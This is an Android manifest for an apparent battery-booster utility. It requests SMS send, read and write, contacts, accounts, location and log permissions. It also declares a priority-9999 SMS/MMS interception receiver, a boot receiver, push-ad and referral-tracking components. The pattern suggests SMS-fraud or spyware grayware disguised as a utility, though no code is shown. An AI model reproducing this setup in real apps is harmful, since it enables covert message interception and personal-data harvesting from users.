<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.extender.sc">
    <uses-permission android:name="android.permission.GET_TASKS"/>
    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.BLUETOOTH"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_LOGS"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-feature android:name="android.hardware.telephony"/>
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="com.androidupgrade.battery.Splash" android:screenOrientation="nosensor">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.androidupgrade.battery.TabHandler" android:screenOrientation="nosensor"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.androidupgrade.battery.TaskKillerActivity" android:screenOrientation="nosensor"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.androidupgrade.battery.UninstallerActivity" android:screenOrientation="nosensor"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.androidupgrade.battery.SecurityAuditActivity" android:screenOrientation="nosensor"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.androidupgrade.battery.InstallerActivity" android:screenOrientation="nosensor"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.androidupgrade.battery.FeaturesActivity" android:screenOrientation="nosensor"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.androidupgrade.battery.BoosterActivity" android:screenOrientation="nosensor"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.androidupgrade.battery.BatteryActivity" android:screenOrientation="nosensor"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.androidupgrade.battery.RatingActivity" android:screenOrientation="nosensor"/>
        <service android:name="com.androidupgrade.battery.BatteryService"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.notifad.android.PushAds"/>
        <receiver android:name="com.notifad.android.UserDetailsReceiver"/>
        <receiver android:name="com.notifad.android.MessageReceiver"/>
        <receiver android:name="com.notifad.android.DeliveryReceiver"/>
        <receiver android:name="com.androidupgrade.battery.BootReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <category android:name="android.intent.category.HOME"/>
            </intent-filter>
        </receiver>
        <service android:name="com.notifad.android.PushService">
            <intent-filter>
                <action android:name="com.notifad.android.PushServiceStart1"/>
            </intent-filter>
        </service>
        <receiver android:exported="true" android:name="com.mobsqueeze.ReferralReceiver">
            <intent-filter>
                <action android:name="com.android.vending.INSTALL_REFERRER"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.mobsqueeze.sms.SmsReceiver">
            <intent-filter android:priority="9999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
            <intent-filter android:priority="9999">
                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED"/>
                <data android:mimeType="application/vnd.wap.mms-message"/>
            </intent-filter>
            <intent-filter android:priority="9999">
                <action android:name="com.mobsqueeze.sms.MESSAGE_RECEIVED"/>
            </intent-filter>
            <intent-filter android:priority="9999">
                <action android:name="com.android.mms.transaction.MESSAGE_SENT"/>
            </intent-filter>
        </receiver>
        <service android:name="com.mobsqueeze.sms.SmsReceiverService"/>
        <receiver android:exported="true" android:name="com.tapjoy.TapjoyReferralTracker">
            <intent-filter>
                <action android:name="com.android.vending.INSTALL_REFERRER"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>